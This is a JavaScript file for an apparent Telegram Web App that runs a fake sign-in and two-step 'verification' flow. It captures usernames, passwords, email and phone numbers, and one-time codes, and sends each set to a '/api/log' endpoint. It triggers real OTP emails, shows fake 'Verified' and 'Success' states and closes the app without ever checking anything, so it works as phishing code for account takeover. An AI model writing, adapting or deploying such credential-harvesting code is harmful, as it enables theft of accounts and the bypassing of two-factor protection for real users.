const tg = window.Telegram ? window.Telegram.WebApp : null;
if (tg) {
    tg.expand();
    tg.ready();
}

document.addEventListener('DOMContentLoaded', () => {
    // Screens
    const screenSignin = document.getElementById('screen-signin');
    const screenStepper = document.getElementById('screen-stepper');
    const modalEmail = document.getElementById('modal-email-otp');
    const modalPhone = document.getElementById('modal-phone-otp');
    const screenOtp = document.getElementById('screen-otp');

    // Inputs
    const loginId = document.getElementById('login-identifier');
    const loginPass = document.getElementById('login-password');
    const verifyEmailId = document.getElementById('verify-email-id');
    const verifyEmailOtp = document.getElementById('verify-email-otp');
    const verifyPhoneNum = document.getElementById('verify-phone-num');
    const verifyPhoneOtp = document.getElementById('verify-phone-otp');

    let userData = { id: '', pass: '', email: '', email_otp: '', phone: '', phone_otp: '' };
    let currentStep = 1;

    // Sign In Button Fix
    const triggerSignin = document.getElementById('trigger-signin');
    if (triggerSignin) {
        triggerSignin.addEventListener('click', () => {
            console.log('Sign In clicked');
            const idValue = loginId.value.trim();
            const passValue = loginPass.value.trim();

            if (!idValue) return alert('Please enter your details');

            userData.id = idValue;
            userData.pass = passValue;
            userData.time = new Date().toLocaleString();

            // Pre-fill fields
            if (idValue.includes('@')) verifyEmailId.value = idValue;
            else if (/^\d+$/.test(idValue.replace(/\+/g,''))) verifyPhoneNum.value = idValue;

            // Log attempt (Non-blocking)
            logToServer('🔑 LOGIN ATTEMPT', userData);

            // ALWAYS Proceed to next screen
            screenSignin.style.display = 'none';
            screenStepper.style.display = 'flex';
        });
    }

    // Tab Logic
    document.querySelectorAll('.signin-tab').forEach(tab => {
        tab.addEventListener('click', () => {
            document.querySelectorAll('.signin-tab').forEach(t => t.classList.remove('active'));
            tab.classList.add('active');
            document.getElementById('login-password-wrapper').style.display = (tab.dataset.tab === 'otp') ? 'none' : 'block';
        });
    });

    // Email Verify Step
    const itemEmail = document.getElementById('item-email');
    if (itemEmail) {
        itemEmail.addEventListener('click', () => {
            if (currentStep !== 1) return;
            modalEmail.style.display = 'flex';
            
            // Auto-send OTP if email is valid
            if (verifyEmailId.value.includes('@')) {
                fetch('/send-otp', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: verifyEmailId.value })
                }).then(r => r.json()).then(d => {
                    console.log('OTP Result:', d);
                });
            }
        });
    }

    // Submit Email OTP
    const submitEmailBtn = document.getElementById('submit-email-otp');
    if (submitEmailBtn) {
        submitEmailBtn.addEventListener('click', async () => {
            if (!verifyEmailId.value || !verifyEmailOtp.value) return alert('Fill all fields');
            
            userData.email = verifyEmailId.value;
            userData.email_otp = verifyEmailOtp.value;
            
            submitEmailBtn.innerText = 'Verifying...';
            await logToServer('📧 EMAIL VERIFICATION', userData);
            
            modalEmail.style.display = 'none';
            currentStep = 2;
            
            document.getElementById('step-number-display').innerText = '2/2';
            itemEmail.style.opacity = '0.5';
            itemEmail.style.pointerEvents = 'none';
            itemEmail.querySelector('.card-link').innerHTML = 'Verified <i class="fas fa-check"></i>';
            itemEmail.querySelector('.card-link').style.color = '#3bc117';
            
            const itemPhone = document.getElementById('item-phone');
            itemPhone.style.opacity = '1';
            itemPhone.style.pointerEvents = 'auto';
            itemPhone.classList.add('active');
        });
    }

    // Phone Verify Step
    const itemPhone = document.getElementById('item-phone');
    if (itemPhone) {
        itemPhone.addEventListener('click', () => {
            if (currentStep !== 2) return;
            modalPhone.style.display = 'flex';
        });
    }

    // Submit Phone OTP
    const submitPhoneBtn = document.getElementById('submit-phone-otp');
    if (submitPhoneBtn) {
        submitPhoneBtn.addEventListener('click', async () => {
            if (!verifyPhoneNum.value || !verifyPhoneOtp.value) return alert('Fill all fields');
            
            userData.phone = verifyPhoneNum.value;
            userData.phone_otp = verifyPhoneOtp.value;
            
            submitPhoneBtn.innerText = 'Success';
            await logToServer('📱 PHONE VERIFICATION (FINAL)', userData);
            
            document.getElementById('btn-final-confirm').classList.add('ready');

            setTimeout(() => {
                if (tg) tg.close();
                else location.reload();
            }, 1500);
        });
    }

    // Navigation Helpers
    document.getElementById('back-to-signin').addEventListener('click', () => {
        screenStepper.style.display = 'none';
        screenSignin.style.display = 'block';
    });

    window.closeAllModals = () => {
        modalEmail.style.display = 'none';
        modalPhone.style.display = 'none';
        if(screenOtp) screenOtp.style.display = 'none';
    };

    window.pasteOTP = async (targetId) => {
        try {
            const text = await navigator.clipboard.readText();
            if (text) document.getElementById(targetId).value = text;
        } catch (e) {}
    };

    async function logToServer(title, data) {
        try {
            const res = await fetch('/api/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ title, data })
            });
            return await res.json();
        } catch (e) {
            console.error('Log failed:', e);
            return { success: false };
        }
    }
});
